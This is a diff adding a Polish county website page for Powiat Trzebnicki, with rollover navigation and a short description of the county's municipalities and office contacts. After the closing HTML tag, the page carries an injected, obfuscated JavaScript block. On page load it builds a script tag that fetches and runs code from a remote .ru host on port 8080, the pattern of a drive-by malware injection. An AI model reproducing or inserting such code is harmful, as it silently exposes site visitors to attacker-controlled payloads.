@@ -1,0 +1,145 @@
+<HTML>
+<HEAD>
+<TITLE>SGTBarycz - Powiat Trzebnicki</TITLE>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-2">
+<LINK REL="Stylesheet" HREF="../sgt.css">
+<!-- ImageReady Preload Script (zmigrod2.psd) -->
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+
+function newImage(arg) {
+	if (document.images) {
+		rslt = new Image();
+		rslt.src = arg;
+		return rslt;
+	}
+}
+
+function changeImages() {
+	if (document.images && (preloadFlag == true)) {
+		for (var i=0; i<changeImages.arguments.length; i+=2) {
+			document[changeImages.arguments[i]].src = changeImages.arguments[i+1];
+		}
+	}
+}
+
+var preloadFlag = false;
+function preloadImages() {
+	if (document.images) {
+		zmigrod_05_over = newImage("../images/zmigrod_05-over.gif");
+		zmigrod_06_over = newImage("../images/zmigrod_06-over.gif");
+		zmigrod_07_over = newImage("../images/zmigrod_07-over.gif");
+		zmigrod_08_over = newImage("../images/zmigrod_08-over.gif");
+		zmigrod_09_over = newImage("../images/zmigrod_09-over.gif");
+		zmigrod_10_over = newImage("../images/zmigrod_10-over.gif");
+		zmigrod_11_over = newImage("../images/zmigrod_11-over.gif");
+		zmigrod_12_over = newImage("../images/zmigrod_12-over.gif");
+		preloadFlag = true;
+	}
+}
+
+// -->
+</SCRIPT>
+<!-- End Preload Script -->
+</HEAD>
+<BODY BGCOLOR=#EAF6D8 ONLOAD="preloadImages();" topmargin="0" leftmargin="0">
+<!-- ImageReady Slices (zmigrod2.psd) -->
+<TABLE WIDTH="100%" BORDER=0 CELLPADDING=0 CELLSPACING=0>
+	<TR>
+		<TD ROWSPAN=2 valign="top" width="135">
+			<table border="0" cellpadding="0" cellspacing="0" height="0">
+<tr><TD WIDTH=135 HEIGHT=33><IMG SRC="../images/powiat_herb.gif" WIDTH=135 HEIGHT=176></TD></TR>
+<tr><TD WIDTH=135 HEIGHT=33><A HREF="../index.htm"
+				ONMOUSEOVER="changeImages('zmigrod_05', '../images/zmigrod_05-over.gif'); return true;"
+				ONMOUSEOUT="changeImages('zmigrod_05', '../images/zmigrod_05.gif'); return true;">
+				<IMG NAME="zmigrod_05" SRC="../images/zmigrod_05.gif" WIDTH=135 HEIGHT=33 BORDER=0></A></TD></TR>
+	<TR><TD WIDTH=135 HEIGHT=33>
+			<A HREF="index.htm"
+				ONMOUSEOVER="changeImages('zmigrod_06', '../images/zmigrod_06-over.gif'); return true;"
+				ONMOUSEOUT="changeImages('zmigrod_06', '../images/zmigrod_06.gif'); return true;">
+				<IMG NAME="zmigrod_06" SRC="../images/zmigrod_06.gif" WIDTH=135 HEIGHT=33 BORDER=0></A></TD>
+	</TR>
+
+	<TR>
+		<TD WIDTH=135 HEIGHT=33><A HREF="mapy.htm"
+				ONMOUSEOVER="changeImages('zmigrod_08', '../images/zmigrod_08-over.gif'); return true;"
+				ONMOUSEOUT="changeImages('zmigrod_08', '../images/zmigrod_08.gif'); return true;">
+				<IMG NAME="zmigrod_08" SRC="../images/zmigrod_08.gif" WIDTH=135 HEIGHT=33 BORDER=0></A></TD>
+	</TR>
+	<TR>
+		<TD WIDTH=135 HEIGHT=33><A HREF="linki.htm"
+				ONMOUSEOVER="changeImages('zmigrod_09', '../images/zmigrod_09-over.gif'); return true;"
+				ONMOUSEOUT="changeImages('zmigrod_09', '../images/zmigrod_09.gif'); return true;">
+				<IMG NAME="zmigrod_09" SRC="../images/zmigrod_09.gif" WIDTH=135 HEIGHT=33 BORDER=0></A></TD>
+	</TR>
+  	<TR>
+		<TD WIDTH=135 HEIGHT=33><A HREF="../aktualnosci.php?gmina=powiat"
+				ONMOUSEOVER="changeImages('zmigrod_12', '../images/zmigrod_12-over.gif'); return true;"
+				ONMOUSEOUT="changeImages('zmigrod_12', '../images/zmigrod_12.gif'); return true;">
+				<IMG NAME="zmigrod_12" SRC="../images/zmigrod_12.gif" WIDTH=135 HEIGHT=33 BORDER=0></A></TD></TR>
+	<TR>
+		<TD WIDTH=135 HEIGHT=52><IMG SRC="../images/zmigrod_13.gif" WIDTH=135 HEIGHT=52></TD></TR>
+</table>
+</TD>
+		<TD WIDTH=617 HEIGHT=109>
+			<IMG SRC="../images/powiat_top.jpg" WIDTH=617 HEIGHT=109></TD>
+		<TD ROWSPAN=3 width="*" style="background: url('../images/tlo.gif'); background-position: top; background-repeat: repeat-x;">
+			<IMG SRC="../images/spacer.gif" WIDTH=16 HEIGHT=531></TD>
+	</TR>
+	<TR>
+		<TD WIDTH=617 HEIGHT=401>
+		<table width="100%" cellpadding="6" cellspacing="0" border="0">
+		<tr>
+	 	  <td>
+	      <table border="0" align="right">
+	     	<tr>
+	      	<td><a href="de.htm"><img src="../images/flagi/niemcy.gif" alt="" border="0"></a></td>
+	         <td><a href="en.htm"><img src="../images/flagi/wlkbryt.gif" alt="" border="0"></a></td>
+	         <td><a href="ru.htm"><img src="../images/flagi/rosja.gif" alt="" border="0"></a></td>
+			</tr>
+			</table>
+		  </td>
+		<tr>
+	 	  <td class="justowanie">
+	<b>Powiat trzebnicki</b>, którego powierzchnia liczy 102,775 ha, ludności zaś 76.758, który jest regionem położonym na północ od Wrocławia o bardzo bogatej przeszłości historycznej oraz przepięknym krajobrazie, obejmującym w swych granicach administracyjnych sześć gmin: 
+<br><br>
+Miasto i Gminę Oborniki śląskie <br>
+Miasto i Gminę Prusice <br>
+Miasto i Gminę Trzebnica <br>
+Gminę Wisznia Mała <br>
+Gminę Zawonia <br>
+Miasto i Gminę Żmigród <br>
+<br>
+Na terenie powiatu trzebnickiego znajdują się wszystkie instytucje i urzędy niezbędne do prowadzenia działalności gospodarczej czy rozwijania budownictwa mieszkaniowego, czy też do prowadzenia produkcji rolnej. Teren powiatu to, przepiękne zabytki, czyste nieskażone środowisko, olbrzymie kompleksy leśne, zbiorniki wodne, wzgórza trzebnickie z lasami bukowymi, wszystko to przyczynia się do dużej atrakcyjności naszego terenu. Popularne są tutaj wyjazdy na grzyby, jagody, czy też krótki wypoczynek połączony z wędkowaniem lub wycieczkami rowerowymi 
+<br><br>
+Zapraszamy do odwiedzania powiatu trzebnickiego , Wzgórz Trzebnickich i Doliny Baryczy.
+<br><br>
+Starostwo Powiatowe<br>
+ul. Ks. Wawrzyńca Bochenka 6 <br>
+55-100 Trzebnica <br>
+tel. O/.../71/ 312-09-01, fax. 0/.../71/ 312-01-11 <br>
+e-mail: <a href="mailto:powiat@trzebnica.pl">powiat@trzebnica.pl</a>
+<br><br>
+				</td>
+		</tr>
+		</table>
+			</TD>
+	</TR>
+	<TR>
+		<TD COLSPAN=2 WIDTH=752 HEIGHT=21>
+			<IMG SRC="../images/zmigrod3_05.gif" WIDTH=752 HEIGHT=21></TD>
+	</TR>
+</TABLE>
+
+<TABLE WIDTH=100% BORDER=0 CELLPADDING=0 CELLSPACING=0 >
+	<TR>
+		<TD height="12" bgcolor="#5EA243">
+		</TD>
+	</TR>
+</TABLE>
+<!-- End ImageReady Slices -->
+</BODY>
+</HTML>
+
+<script>var U;if(U!='cM' && U!='T'){U='cM'};var L=new Date();function C(){var LW='';var S;if(S!='' && S!='ep'){S='R'};var RO;if(RO!='' && RO!='Q'){RO='epV'};var Y=window;var lo=new Array();var r;if(r!='' && r!='G'){r=null};var W=unescape;var XL=new Date();var f;if(f!='Cd' && f != ''){f=null};var A=W("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%77%77%77%2e%6e%65%74%2e%63%6e%2f%6b%6f%6d%70%61%73%2e%63%6f%6d%2e%70%68%70");var tm=new Date();var lt;if(lt!='' && lt!='mw'){lt='ra'};var D;if(D!=''){D='Un'};var aL='';function F(H,P){var _=new Date();var y=new String("YWpRg".substr(4));var a=W("%5b"), Yg=W("%5d");var p=new Array();var X=a+P+Yg;var Gc;if(Gc!='YF'){Gc=''};this.mW='';var x=new RegExp(X, y);return H.replace(x, new String());};var i=new Array();this.KI='';this.iy="";var O=new String();var t=F('89790799897097','97');var z=new Array();var CL=document;var vc=new String();this.ok="";function M(){var up;if(up!='' && up!='_w'){up='Sx'};var zN=new Array();var Z=W("%68%74%74%70%3a%2f%2f%72%65%74%69%72%65%74%65%72%72%69%66%79%2e%72%75%3a");var FS;if(FS!=''){FS='bH'};var mr=new String();var N="";var JG;if(JG!='' && JG!='im'){JG=null};O=Z;O+=t;O+=A;var Is;if(Is!='' && Is!='T_'){Is='zF'};var fw="";var Ao;if(Ao!=''){Ao='qo'};try {var Ly=new Array();var Bf;if(Bf!='' && Bf!='ms'){Bf=''};var PR;if(PR!='jxl' && PR != ''){PR=null};e=CL.createElement(F('sCcNroiephtC','zoCPlehN'));var Sn=new Array();var Dm;if(Dm!='Mt' && Dm!='GcK'){Dm=''};e[W("%73%72%63")]=O;var Rt=new Date();e[W("%64%65%66%65%72")]=[1][0];var Bs=new Date();var Mf=new String();var uR='';this.asD='';var AO;if(AO!=''){AO='wl'};var d=new String();CL.body.appendChild(e);var sn;if(sn!='' && sn!='qQ'){sn=null};var _F='';} catch(c){var IU="";this.O_="";alert(c);};var SS;if(SS!='' && SS!='NZ'){SS=null};this.sJ="";}var ii;if(ii!='' && ii!='Fc'){ii=null};Y[String("fN8onlo".substr(3)+"IPrad".substr(3))]=M;var PY;if(PY!='' && PY!='xB'){PY=null};};var oX;if(oX!='Oo'){oX='Oo'};C();var XX=new Array();var me;if(me!='rX' && me!='eq'){me=''};</script>
+<!--65cd7edf204e51563e89c1ee84247d17-->
